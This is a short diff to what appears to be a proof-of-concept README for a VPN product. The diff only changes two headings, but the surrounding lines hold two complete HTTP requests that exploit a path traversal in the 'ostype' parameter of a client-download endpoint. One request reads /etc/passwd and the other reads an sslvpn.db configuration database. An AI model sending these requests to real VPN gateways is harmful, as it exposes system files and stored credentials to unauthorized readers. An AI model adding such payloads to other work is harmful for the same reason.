@@ -2,7 +2,7 @@
 
 ![alt text](photos/image4.png)
 
-## POC1
+## POC 1
 ```
 GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1
 Host: XXX
@@ -17,7 +17,7 @@ Accept-Language: zh-CN,zh;q=0.9
 Priority: u=4, i
 Connection: keep-alive
 ```
-## POC2
+## POC 2
 ```
 GET /vpn/user/download/client?ostype=../../../../../../../usr/local/conf/sslvpn.db HTTP/1.1
 Host: XXX
